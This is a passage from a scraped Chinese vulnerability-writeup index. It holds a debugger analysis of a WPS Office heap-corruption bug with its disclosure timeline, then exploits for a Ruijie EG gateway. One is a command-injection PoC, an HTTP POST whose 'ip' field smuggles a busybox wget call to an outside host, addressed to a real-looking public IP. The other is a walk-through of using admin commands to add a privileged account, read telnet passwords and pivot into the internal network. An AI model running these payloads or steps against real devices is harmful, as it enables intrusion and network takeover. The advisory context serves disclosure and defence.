[edx+eax*4+10h] ds:002b:cd2c7290=???????? \u5728IDA Pro\u4e2d\u6253\u5f00\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u6309\u4ee5\u4e0b\u65b9\u5f0f\u53cd\u6c47\u7f16\u8be5\u51fd\u6570\uff1a .text:67353315 push ebp .text:67353316 mov ebp, esp .text:67353318 movzx eax, byte ptr [ecx+edx] ; crash here .text:6735331C mov ecx, [ebp+arg_0] .text:6735331F mov edx, [ecx] .text:67353321 mov eax, [edx+eax*4+10h] .text:67353325 mov ecx, eax \u4f7f\u7528\u6545\u969c\u8f6c\u50a8\u4e2d\u7684\u4fe1\u606f\uff0c\u6211\u4eec\u77e5\u9053\u5e94\u7528\u7a0b\u5e8f\u5728 0x67353321\uff08\u79fb\u52a8eax\uff0c[edx + eax * 4 + 10h]\uff09 \u5904\u89e6\u53d1\u4e86\u8bbf\u95ee\u51b2\u7a81\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230EAX\u5bc4\u5b58\u5668\u75310xc0\u503c\u63a7\u5236\u3002\u56e0\u6b64\uff0c\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u5bfc\u81f4\u5f02\u5e38\u7684\u6307\u4ee4\u5bf9\u5bc4\u5b58\u5668\u7684\u72b6\u6001\u8fdb\u884c\u4e00\u4e9b\u5047\u8bbe\u3002\u9700\u8981\u6ce8\u610f\u7684\u91cd\u8981\u4e00\u70b9\u662f\uff0c\u5728\u53d1\u751f\u5f02\u5e38\u4e4b\u524d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230ECX\uff080xc0\uff09\u4e2d\u5305\u542b\u7684\u503c\u6b63\u5728\u5199\u5165\u5230\u4ee5\u4e0b\u6307\u4ee4\u6240\u5b9a\u4e49\u7684\u4efb\u610f\u4f4d\u7f6e\uff1a mov ecx, [ebp+arg_0] \u6b64\u5916\uff0c\u6211\u4eec\u6ce8\u610f\u5230\uff0c\u5728\u6211\u4eec\u7684\u6545\u969c\u6307\u4ee4\u4e4b\u5916\uff0cEBP\u7684\u504f\u79fb\u91cf\u5b58\u50a8\u5728ECX\u5bc4\u5b58\u5668\u4e2d\u3002\u6211\u4eec\u5728\u524d\u9762\u63d0\u5230\u7684\u6307\u4ee4\uff08\u504f\u79fb\u91cf\u4e3a0x6ba1331c\uff09\u4e0a\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u65ad\u70b9\uff0c\u4ee5\u89c2\u5bdf\u5185\u5b58\u3002\u65ad\u70b9\u89e6\u53d1\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7b2c\u4e00\u4e2a\u503cc45adfbc\u5f15\u7528\u4e86\u53e6\u4e00\u4e2a\u6307\u9488\uff0c\u8be5\u6307\u9488\u5e94\u8be5\u662f\u6307\u5411\u6570\u7ec4\u7684\u6307\u9488\u3002``` Breakpoint 0 hit eax=0000000f ebx=004f1b40 ecx=d3544100 edx=0000001c esi=d1200e18 edi=0000001c eip=6ba1331c esp=004f1a34 ebp=004f1a34 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!QMatrix::dy+0x48a3: 6ba1331c 8b4d08 mov ecx,dword ptr [ebp+8] ss:002b:004f1a3c=c45adfbc 0:000> dc ebp+8 004f1a3c c45adfbc 00000048 00000000 6f13830f ..Z.H..........o 004f1a4c 004f5cc8 00000000 00000000 00000000 .\\O............. 004f1a5c 00000000 004f65a0 004f662c 00000000 .....eO.,fO..... 004f1a6c 779eae8e 00000000 00000001 3f800000 ...w...........? 004f1a7c 3f800000 3f31e4f8 3f800000 3f800000 ...?..1?...?...? 004f1a8c 3f800000 3f31e4f8 3f800000 3de38800 ...?..1?...?...= 004f1a9c 3de38800 3d9e1c8a 3c834080 004f3c00 ...=...=.@.<.<O. 004f1aac 4101c71c 6ba13315 3f800000 4081c71c ...A.3.k...?...@ \u4ecec45adfbc\u89c2\u5bdf\u5185\u5b58\u5f15\u7528\uff0c\u53d1\u73b0\u53e6\u4e00\u4e2a\u6307\u9488\u3002\u7b2c\u4e00\u4e2a\u503cab69cf80\u59cb\u7ec8\u8868\u793a\u4e3a\u6307\u5411\u5b83\u6240\u5f15\u7528\u7684\u4efb\u4f55\u5730\u65b9\u7684\u6307\u9488\u3002\u6307\u9488ab69cf80\u57fa\u672c\u4e0a\u662f\u6211\u4eec\u6307\u9488\u7684\u7d22\u5f15\u6570\u7ec4\u3002 0:000> dc c45adfbc c45adfbc ab69cf80 d3544100 00000003 00000280 ..i..AT......... c45adfcc 0000055a 00000012 c0c0c0c0 1c3870e2 Z............p8. c45adfdc 40ad870e 1c3870e2 40ad870e 00000000 ...@.p8....@.... c45adfec 00000000 c0c0c0c1 6c1d12c0 00000000 ...........l.... c45adffc c0c0c0c0 ???????? ???????? ???????? ....???????????? c45ae00c ???????? ???????? ???????? ???????? ???????????????? c45ae01c ???????? ???????? ???????? ???????? ???????????????? c45ae02c ???????? ???????? ???????? ???????? ???????????????? 0:000> dc ab69cf80 ab69cf80 00000001 0000001c 00000010 00000001 ................ // 0000001c is overwritten in the register EDX and EDI before we trigger crash ab69cf90 ff000000 ff800000 ff008000 ff808000 ................ ab69cfa0 ff000080 ff800080 ff008080 ff808080 ................ ab69cfb0 ffc0c0c0 ffff0000 ff00ff00 ffffff00 ................ // ffc0c0c0 where it will be stored in EAX after crash, at the moment it only takes 0xf value in EAX ab69cfc0 ff0000ff ffff00ff ff00ffff ffffffff ................ ab69cfd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ ab69cfe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ ab69cff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ \u56e0\u4e3a\u6211\u4eec\u77e5\u9053\u5d29\u6e83\u7684\u8def\u5f84\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u7b80\u5355\u5730\u8bbe\u7f6e\u4e00\u4e2a\u65ad\u70b9\u3002\u8be5\u547d\u4ee4\u5c06\u83b7\u5f97\u6307\u9488\u503c\u201c edx + eax \\* 4 + 10\u201d\uff0c\u5e76\u68c0\u67e5\u5176\u662f\u5426\u6ee1\u8db30xc0\u3002 bp 6ba13321 \".if (poi(edx+eax*4+10) == 0xc0) {} .else {gc}\" 0:000> g eax=000000c0 ebx=004f1b40 ecx=c45adfbc edx=ab69cf80 esi=d1200e18 edi=0000001c eip=6ba13321 esp=004f1a34 ebp=004f1a34 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!QMatrix::dy+0x48a8: 6ba13321 8b448210 mov eax,dword ptr [edx+eax*4+10h] ds:002b:ab69d290=???????? \u5982\u679c\u89c2\u5bdf\u5806\u6808\uff0c\u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u6267\u884c\uff1a 004f1a38 6ba3cb98 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74 004f1a3c c45adfbc 004f1a40 00000048 004f1a44 00000000 004f1a48 6f13830f verifier!DphCommitMemoryForPageHeap+0x16f 004f1a4c 004f5cc8 004f1a50 00000000 004f1a54 00000000 004f1a58 00000000 004f1a5c 00000000 004f1a60 004f65a0 004f1a64 004f662c 004f1a68 00000000 004f1a6c 779eae8e ntdll!RtlAllocateHeap+0x3e \u5982\u679c\u6211\u4eec\u53cd\u6c47\u7f166ba3cb98\uff0c\u5219\u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u53cd\u6c47\u7f16\u4ee3\u7801\u3002\u771f\u6b63\u7684\u6839\u672c\u539f\u56e0\u5728\u4e8e\u6b64\u4ee3\u7801\u3002 6ba3cb89 8b96b4000000 mov edx,dword ptr [esi+0B4h] 6ba3cb8f 8b4df4 mov ecx,dword ptr [ebp-0Ch] 6ba3cb92 52 push edx 6ba3cb93 8bd7 mov edx,edi 6ba3cb95 ff5580 call dword ptr [ebp-80h] 6ba3cb98 8b4e7c mov ecx,dword ptr [esi+7Ch] C pseudo code grad = (&ptr_grad); if ( grad > 0.0099999998 ) { input_value = grad_size(check, size, input); ptr_grad = (input); ... cut here ... \u6211\u4eec\u57286ba3cb89\u5730\u5740\u4e0a\u8bbe\u7f6e\u65ad\u70b9\uff0c\u5e76\u89c2\u5bdfESI + 0xB4\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u6307\u9488\u6307\u5411\u53e6\u4e00\u4e2a\u4f4d\u7f6e\uff1a 0:000> r eax=00000000 ebx=00791878 ecx=00000005 edx=00793938 esi=cb07de18 edi=0000001c eip=6ba3cb89 esp=00791780 ebp=00791870 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a65: 6ba3cb89 8b96b4000000 mov edx,dword ptr [esi+0B4h] ds:002b:cb07decc=cf69afbc 0:000> dc esi+0B4h cb07decc cf69afbc c0c0c000 00000000 00000100 ..i............. cb07dedc c0c0c0c0 00000000 00000000 00000000 ................ cb07deec 00000000 00000000 00000000 00000000 ................ cb07defc 00000000 cf030fd0 00000000 00000000 ................ cb07df0c 00000000 00000000 00000000 00000000 ................ cb07df1c c0c0c0c0 00000000 3ff00000 00000000 ...........?.... cb07df2c 00000000 00000000 00000000 00000000 ................ cb07df3c 00000000 00000000 3ff00000 00000000 ...........?.... 0:000> dc cf69afbc cf69afbc c88baf80 d1326100 00000003 00000280 .....a2......... cf69afcc 0000055f 00000012 c0c0c0c0 1c3870e2 _............p8. cf69afdc 40ad870e 1c3870e2 40ad870e 00000000 ...@.p8....@.... cf69afec 00000000 c0c0c0c1 6c1d12c0 00000000 ...........l.... cf69affc c0c0c0c0 ???????? ???????? ???????? ....???????????? cf69b00c ???????? ???????? ???????? ???????? ???????????????? cf69b01c ???????? ???????? ???????? ???????? ???????????????? cf69b02c ???????? ???????? ???????? ???????? ???????????????? 0:000> dc c88baf80 c88baf80 00000001 0000001c 00000010 00000001 ................ c88baf90 ff000000 ff800000 ff008000 ff808000 ................ c88bafa0 ff000080 ff800080 ff008080 ff808080 ................ c88bafb0 ffc0c0c0 ffff0000 ff00ff00 ffffff00 ................ c88bafc0 ff0000ff ffff00ff ff00ffff ffffffff ................ c88bafd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88bafe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88baff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u4ee3\u7801\u5b9e\u9645\u4e0a\u6ca1\u6709\u4ece\u6307\u9488\u91ca\u653e\u4efb\u4f55\u4e1c\u897f\u3002\u4e00\u65e6\u79fb\u81f3EDX\uff0cEDX\u5c06\u4fdd\u7559\u6307\u5411\u7d22\u5f15\u6570\u7ec4\u7684\u6307\u9488\uff1a eax=00000000 ebx=00791878 ecx=00000005 edx=cf69afbc esi=cb07de18 edi=0000001c eip=6ba3cb8f esp=00791780 ebp=00791870 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a6b: 6ba3cb8f 8b4df4 mov ecx,dword ptr [ebp-0Ch] ss:002b:00791864=d1326100 0:000> dc cf69afbc cf69afbc c88baf80 d1326100 00000003 00000280 .....a2......... cf69afcc 0000055f 00000012 c0c0c0c0 1c3870e2 _............p8. cf69afdc 40ad870e 1c3870e2 40ad870e 00000000 ...@.p8....@.... cf69afec 00000000 c0c0c0c1 6c1d12c0 00000000 ...........l.... cf69affc c0c0c0c0 ???????? ???????? ???????? ....???????????? cf69b00c ???????? ???????? ???????? ???????? ???????????????? cf69b01c ???????? ???????? ???????? ???????? ???????????????? cf69b02c ???????? ???????? ???????? ???????? ???????????????? 0:000> dc c88baf80 c88baf80 00000001 0000001c 00000010 00000001 ................ c88baf90 ff000000 ff800000 ff008000 ff808000 ................ c88bafa0 ff000080 ff800080 ff008080 ff808080 ................ c88bafb0 ffc0c0c0 ffff0000 ff00ff00 ffffff00 ................ c88bafc0 ff0000ff ffff00ff ff00ffff ffffffff ................ c88bafd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88bafe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88baff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ \u5d29\u6e83\u540e\u7684\u5806\u6808\u8ddf\u8e2a\uff1a 0:000> kvL # ChildEBP RetAddr Args to Child 00 012f18d4 6ba3cb98 cc53afbc 00000048 00000000 QtCore4!QMatrix::dy+0x48a8 01 012f19d0 6b8143ef 00000000 012f1b78 012f1a5c QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74 02 012f1a30 6b814259 0000002e 012f5bd0 00000000 QtCore4!QBrush::setMatrix+0x234 03 012f5b14 6b8249a4 0000003b 012f5b68 cc780e18 QtCore4!QBrush::setMatrix+0x9e 04 012f5b2c 6b80cc84 0000003b 012f5b68 cc780e18 QtCore4!QImage::rect+0x22b 05 012f5b48 6b857ccc 0000003b 012f5b68 cc780e18 QtCore4!QTransform::inverted+0xec8 06 012f64dc 6b81c55b 00000000 003c0000 00000000 QtCore4!QSvgFillStyle::setFillOpacity+0x1b59 07 012f66c0 6b896844 012f6724 cc818ff0 0000001c QtCore4!QPainter::drawPixmap+0x1c98 08 012f67b4 6d1e0fbd 012f69ec 012f66d4 012f6864 QtCore4!QPainter::drawImage+0x325 09 012f67d4 6d0dd155 012f6a54 012f69ec 012f6864 kso!GdiDrawHoriLineIAlt+0x11a1a 0a 012f67ec 6d0c8d88 012f69ec 012f68e0 012f6864 kso!kpt::PainterExt::drawBitmap+0x23 \u5806\u5206\u6790\uff1a 0:000> !heap -p -a cc53afbc address cc53afbc found in _DPH_HEAP_ROOT @ 6731000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) cc36323c: cc53afa8 58 - cc53a000 2000 6f13ab70 verifier!AVrfDebugPageHeapAllocate+0x00000240 77a9909b ntdll!RtlDebugAllocateHeap+0x00000039 779ebbad ntdll!RtlpAllocateHeap+0x000000ed 779eb0cf ntdll!RtlpAllocateHeapInternal+0x0000022f 779eae8e ntdll!RtlAllocateHeap+0x0000003e 6f080269 MSVCR100!malloc+0x0000004b 6f08233b MSVCR100!operator new+0x0000001f 6b726c67 QtCore4!QImageData::create+0x000000fa 6b726b54 QtCore4!QImage::QImage+0x0000004e 6b7a0e21 QtCore4!png_get_text+0x00000436 6b79d7a8 QtCore4!QImageIOHandler::setFormat+0x000000de 6b79d457 QtCore4!QPixmapData::fromFile+0x000002bf 6b725eb4 QtCore4!QImageReader::read+0x000001e2 6d0ca585 kso!kpt::VariantImage::forceUpdateCacheImage+0x0000254e 6d0c5964 kso!kpt::Direct2DPaintEngineHelper::operator=+0x00000693 6d0c70d0 kso!kpt::RelativeRect::unclipped+0x00001146 6d0c8d0c kso!kpt::VariantImage::forceUpdateCacheImage+0x00000cd5 6d451d5c kso!BlipCacheMgr::BrushCache+0x0000049a 6d451e85 kso!BlipCacheMgr::GenerateBitmap+0x0000001d 6d453227 kso!BlipCacheMgr::GenCachedBitmap+0x00000083 6d29bb92 kso!drawing::PictureRenderLayer::render+0x000009b6 6d450fb1 kso!drawing::RenderTargetImpl::paint+0x00000090 6d29b528 kso!drawing::PictureRenderLayer::render+0x0000034c 6d2a2d83 kso!drawing::VisualRenderer::render+0x00000060 6d2b8970 kso!drawing::SingleVisualRenderer::drawNormal+0x000002b5 6d2b86a7 kso!drawing::SingleVisualRenderer::draw+0x000001e1 6d2b945e kso!drawing::SingleVisualRenderer::draw+0x00000046 6d3d0142 kso!drawing::ShapeVisual::paintEvent+0x0000044a 680a2b5c wpsmain!WpsShapeTreeVisual::getHittestSubVisuals+0x000068f1 6d0e36df kso!AbstractVisual::visualEvent+0x00000051 6d3cbe97 kso!drawing::ShapeVisual::visualEvent+0x0000018f 6d0eba90 kso!VisualPaintEvent::arriveVisual+0x0000004e 0:000> dt _DPH_BLOCK_INFORMATION cc780e18-0x20 verifier!_DPH_BLOCK_INFORMATION +0x000 StartStamp : 0xc0c0c0c0 +0x004 Heap : 0xc0c0c0c0 Void +0x008 RequestedSize : 0xc0c0c0c0 +0x00c ActualSize : 0xc0c0c0c0 +0x010 Internal : _DPH_BLOCK_INTERNAL_INFORMATION +0x018 StackTrace : 0xc0c0c0c0 Void +0x01c EndStamp : 0xc0c0c0c0 \u6bb5\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5806\u6761\u76ee\u901a\u5e38\u662f\u4e00\u4e2a\u7a7a\u95f2\u5757\u3002\u5806\u5757\u7684\u72b6\u6001\u6307\u793a\u4e3a\u7a7a\u95f2\u5757\u3002\u5806\u5757\u58f0\u660e\u524d\u4e00\u4e2a\u5757\u7684\u5927\u5c0f\u4e3a00108\uff0c\u800c\u5f53\u524d\u5757\u7684\u5927\u5c0f\u4e3a00a30\u3002\u524d\u4e00\u5757\u62a5\u544a\u5176\u81ea\u8eab\u5927\u5c0f\u4e3a0x20\u5b57\u8282\uff0c\u4e0d\u5339\u914d\u3002\u4f4d\u7f6e\u4e3a05f61000\u7684\u5806\u5757\u7684\u4f7f\u7528\u4f3c\u4e4e\u662f\u8be5\u5806\u5757\u7684\u4f7f\u7528\u5bfc\u81f4\u4ee5\u4e0b\u5757\u7684\u5143\u6570\u636e\u635f\u574f\u7684\u53ef\u80fd\u6027\u3002\u5806\u5757\uff1a 0:000> !heap -a 05f60000 Index Address Name Debugging options enabled 1: 05f60000 Segment at 05f60000 to 0605f000 (00001000 bytes committed) Flags: 00000002 ForceFlags: 00000000 Granularity: 8 bytes Segment Reserve: 00100000 Segment Commit: 00002000 DeCommit Block Thres: 00000200 DeCommit Total Thres: 00002000 Total Free Size: 00000146 Max. Allocation Size: fffdefff Lock Variable at: 05f60258 Next TagIndex: 0000 Maximum TagIndex: 0000 Tag Entries: 00000000 PsuedoTag Entries: 00000000 Virtual Alloc List: 05f6009c Uncommitted ranges: 05f6008c 05f61000: 000fe000 (1040384 bytes) FreeList[ 00 ] at 05f600c0: 05f605b8 . 05f605b8 05f605b0: 00108 . 00a30 [100] - free Segment00 at 05f60000: Flags: 00000000 Base: 05f60000 First Entry: 05f604a8 Last Entry: 0605f000 Total Pages: 000000ff Total UnCommit: 000000fe Largest UnCommit:00000000 UnCommitted Ranges: (1) Heap entries for Segment00 in Heap 05f60000 address: psize . size flags state (requested size) 05f60000: 00000 . 004a8 [101] - busy (4a7) 05f604a8: 004a8 . 00108 [101] - busy (107) Internal 05f605b0: 00108 . 00a30 [100] 05f60fe0: 00a30 . 00020 [111] - busy (1d) 05f61000: 000fe000 - uncommitted bytes. 0:000> dd 05f60fe0 05f60fe0 a9b3c836 03007087 05f6008c 05f6008c 05f60ff0 05f60038 05f60038 05f61000 000fe000 05f61000 ???????? ???????? ???????? ???????? 05f61010 ???????? ???????? ???????? ???????? 05f61020 ???????? ???????? ???????? ???????? 05f61030 ???????? ???????? ???????? ???????? 05f61040 ???????? ???????? ???????? ???????? 05f61050 ???????? ???????? ???????? ???????? ```","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E9%87%91%E5%B1%B1WPS%20Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_3","text":"\u8be5\u6f0f\u6d1e\u4e8e2020\u5e748\u6708\u62a5\u544a\u3002\u62ab\u9732\u65f6\u95f4\u8868\uff1a 2020-08-04-\u5c06\u7535\u5b50\u90ae\u4ef6\u53d1\u9001\u5230\u516c\u5f00\u63d0\u4f9b\u7684WPS\u7684\u5404\u79cd\u90ae\u4ef6\u5217\u8868\uff08\u9500\u552e\u548c\u652f\u6301\uff09\u3002 2020-08-10-WPS\u56e2\u961f\u56de\u5e94\u8be5\u62a5\u544a\u53ef\u4ee5\u8f6c\u53d1\u7ed9\u4ed6\u4eec\u3002 2020-08-11-\u8981\u6c42\u8fdb\u4e00\u6b65\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u54a8\u8be2\u548c\u5411\u9002\u5f53\u7684\u6e20\u9053\u62ab\u9732\u7b49\u3002 2020-08-17-\u6839\u636e\u5148\u524d\u7684\u8981\u6c42\u4e0eWPS\u56e2\u961f\u8fdb\u884c\u8ddf\u8fdb\u3002 2020-08-18-WPS\u56e2\u961f\u505a\u51fa\u56de\u5e94\uff0c\u4ed6\u4eec\u4f1a\u7167\u987e\u597d\u5b83\uff0c\u5e76\u8f6c\u4ea4\u7ed9\u5f00\u53d1\u56e2\u961f\u3002 2020-08-18-\u901a\u8fc7\u7535\u5b50\u90ae\u4ef6\u63d0\u4f9b\u6280\u672f\u62a5\u544a\u548c\u6982\u5ff5\u9a8c\u8bc1\uff08\u672a\u52a0\u5bc6\uff09\u3002 2020-08-25-WPS\u8ddf\u8fdb\u62a5\u544a\u8fdb\u5ea6\u3002 2020-08-26-WPS\u66f4\u65b0\u8bf4\u6b64\u95ee\u9898\u5df2\u8f6c\u53d1\u7ed9\u5f00\u53d1\u56e2\u961f\u3002 2020-08-28-WPS\u53d1\u9001\u4e86\u4e00\u5c01\u7535\u5b50\u90ae\u4ef6\uff0c\u6307\u51fa\u8be5\u95ee\u9898\u5df2\u5728\u6700\u65b0\u7684\u4e0b\u8f7d\u7248\u672c11.2.0.9403\u4e2d\u5f97\u5230\u89e3\u51b3\u3002 2020-08-28-\u9488\u5bf9\u63d0\u4f9b\u7684PoC\u6d4b\u8bd5\u4e86\u65b0\u7248\u672c\uff0c\u5e76\u786e\u8ba4\u95ee\u9898\u5df2\u89e3\u51b3\u3002 2020-08-28-\u5411WPS\u56e2\u961f\u5bfb\u6c42\u54a8\u8be2\u6216\u66f4\u6539\u65e5\u5fd7\u66f4\u65b0\u3002 2020-08-31-WPS\u56e2\u961f\u901a\u77e5\u4ed6\u4eec\u4e0d\u518d\u66f4\u65b0\u6216\u7ef4\u62a4\u4efb\u4f55\u5b89\u5168\u516c\u544a\u3002 2020-09-03-\u6f0f\u6d1e\u5199\u4fe1 \u8981\u6c42CVE\u3002","title":"\u62ab\u9732\u65f6\u95f4\u8868"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"\u6d4b\u8bd5\u56fa\u4ef6\u7248\u672c\u4e3a EG_RGOS11.9(4)B11P1_EG3200_install guest_auth \u4e2d\u7684 guestIsUp.php \u6587\u4ef6\u5b58\u5728\u95ee\u9898 \u53ef\u4ee5\u660e\u663e\u770b\u51fa\u8fd9\u91cc\u53ef\u4ee5\u5b58\u5728\u62fc\u63a5\u8fbe\u5230\u547d\u4ee4\u6267\u884c\u7684\u6548\u679c\u3002 \u6784\u9020\u76f8\u5e94\u7684 poc \u53ef\u8fbe\u5230\u547d\u4ee4\u6267\u884c POC \u00b6 POST /guest_auth/guestIsUp.php HTTP/1.1 Host: 120.35.11.141:9999 Connection: keep-alive Content-Length: 45 Pragma: no-cache Cache-Control: no-cache Accept: application/json, text/javascript, */*; q=0.01 Origin: http://120.35.11.141:9999 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Content-Type: application/x-www-form-urlencoded Referer: http://120.35.11.141:9999/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 mac=1&ip='busybox wget xxxxx:8888'","title":"\u9510\u6377\u6613\u7f51\u5173 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#poc","text":"POST /guest_auth/guestIsUp.php HTTP/1.1 Host: 120.35.11.141:9999 Connection: keep-alive Content-Length: 45 Pragma: no-cache Cache-Control: no-cache Accept: application/json, text/javascript, */*; q=0.01 Origin: http://120.35.11.141:9999 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Content-Type: application/x-www-form-urlencoded Referer: http://120.35.11.141:9999/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 mac=1&ip='busybox wget xxxxx:8888'","title":"POC"},{"location":"%E5%85%B6%E4%BB%96%E4%BA%92%E8%81%94%E7%BD%91%E5%8E%82%E5%95%86/%E9%94%90%E6%8D%B7%E6%98%93%E7%BD%91%E5%85%B3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"\u6f0f\u6d1e\u8bf4\u660e \u00b6 \u5728web\u7ba1\u7406\u9875\u9762\u4e0a\uff0c\u4f7f\u7528\u7ba1\u7406\u5458\u7684\u7528\u6237\u540d\u5bc6\u7801\u767b\u5f55\u8bbe\u5907\u540e\uff0c\u53ef\u901a\u8fc7web\u9875\u9762\u6267\u884c\u90e8\u5206\u64cd\u4f5c\u547d\u4ee4\uff0c\u8bbe\u5907\u4e0a\u6709\u63a5\u53e3\u6765\u8bfb\u53d6\u8fd9\u4e9b\u64cd\u4f5c\u547d\u4ee4\u7684\u8fd4\u56de\u503c\u3002\u63a5\u53e3\u5bf9\u8fd4\u56de\u503c\u4e2d\u5b58\u5728\u7684\u6076\u610f\u6307\u4ee4\u8fc7\u6ee4\u4e0d\u5145\u5206\uff0c\u5bfc\u81f4\u8bbe\u5907\u53ef\u4ee5\u901a\u8fc7CLI\u88ab\u8fdc\u7a0b\u6267\u884c\u4e00\u4e9b\u6076\u610f\u6307\u4ee4\uff0c\u5bf9\u8bbe\u5907\u6b63\u5e38\u8fd0\u884c\u9020\u6210\u5f71\u54cd\u3002 \u5f71\u54cd\u8303\u56f4 \u00b6 \u76ee\u524d\u4ec5\u7f51\u5173\u4ea7\u54c1\u768411x\u7248\u672c\u5b58\u5728\u6b64\u95ee\u9898\uff0c10.x\u7248\u672c\u672a\u53d1\u73b0\u6b64\u95ee\u9898\u3002 \u6f0f\u6d1e\u8be6\u60c5 \u00b6 web\u9875\u9762\u7684\u7ba1\u7406\u5458\u7528\u6237\u540d\u3001\u5bc6\u7801\u6cc4\u6f0f\uff0c\u4e14http\u767b\u5f55\u8bbf\u95ee\u6210\u529f\u7684\u60c5\u51b5\u4e0b\u4f1a\u53d1\u751f\u3002 \u8fdb\u5165\u9510\u6377\u6613\u7f51\u5173\u767b\u5f55\u754c\u9762\uff0c\u6293\u53d6\u4e00\u4e2a\u767b\u5f55\u6570\u636e\u5305\uff1a \u53d1\u73b0\u53c2\u6570\u4e2d\u6709command=\u6267\u884c\u7684\u547d\uff0cstrurl=\u5e94\u8be5\u662f\u5f53\u524d\u7684\u8fd0\u884c\u6a21\u5f0f\u6316\u6398\u540e\u53d1\u73b0\u6709exec\u548cconfig\u7b49\uff0cmode=priv_exec\u76f4\u63a5\u7279\u6743\u6a21\u5f0f \u8f93\u5165 sh run\u547d\u4ee4\u8fdb\u884c\u5c1d\u8bd5\uff0c\u53ef\u67e5\u770b\u5230\u6709\u76f8\u5e94\u7684\u7528\u6237\u4fe1\u606f\uff1a \u6ce8\u610f\u5230\u8fd9\u91cc\u6709\u4e00\u4e2awebmaster level 0 1 2\uff0c\u901a\u8fc7\u4e86\u89e30\u7684\u7ea7\u522b\u662f\u6700\u9ad8\u7684\uff0c\u4e5f\u5c31\u662f\u6743\u9650\u662f\u6700\u597d\u7684\uff0c1\u548c2 \u4f9d\u6b21\u51cf\u4f4e\u3002 \u5c1d\u8bd5\u901a\u8fc7\u6267\u884cwebmaster level 0 username guest password guest\u6765\u63d0\u5347\u6743\u9650\uff0c\u9700\u8981\u628astrurl\u6539\u6210config\u5373\u53ef\u6267\u884c\u6210\u529f\u3002 \u518d\u67e5\u770bshow run\u6700\u4e0b\u9762\u53d1\u4e0b\u6709telnet\u7684\u5bc6\u7801\u4fe1\u606f\uff1a \u4e4b\u540e\u5c31\u53ef\u901a\u8fc7telnet\u8fdb\u5165\uff0c\u518d\u914d\u7f6e\u4e00\u4e2aVPN\u8d26\u53f7\u540e\u5c31\u53ef\u8fdb\u884c\u5185\u7f51\u6f2b\u6e38\uff1a \u7279\u5f81\uff1a \u00b6 \u7248\u672c\uff1a\u9510\u6377\u6613\u7f51\u5173\u4ea7\u54c111x\u7248\u672c \u534f\u8bae\uff1ahttp\u534f\u8bae\uff0c\u9ed8\u8ba4\u7aef\u53e380 \u6d41\u91cf\u63a2\u6d4b\u53c2\u6570\u4e2d\u5305\u542b\uff1acommand=\u3001strurl=\u3001 exec\u3001 